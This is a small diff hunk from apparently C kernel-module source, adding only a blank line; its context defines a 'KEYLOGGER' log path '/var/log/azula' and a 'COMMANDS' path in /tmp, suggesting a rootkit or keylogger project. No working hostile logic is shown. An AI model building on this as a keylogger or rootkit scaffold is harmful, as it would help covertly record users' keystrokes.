@@ -44,5 +44,6 @@
 #define KEYLOGGER "/var/log/azula"
 #define COMMANDS "/tmp/azula" //Come back for this
 
+
 MALLOC_DECLARE(M_TEMPBUFFER);
 MALLOC_DEFINE(M_TEMPBUFFER, "SHORT DESCRIP", "LONG DESCRIP");
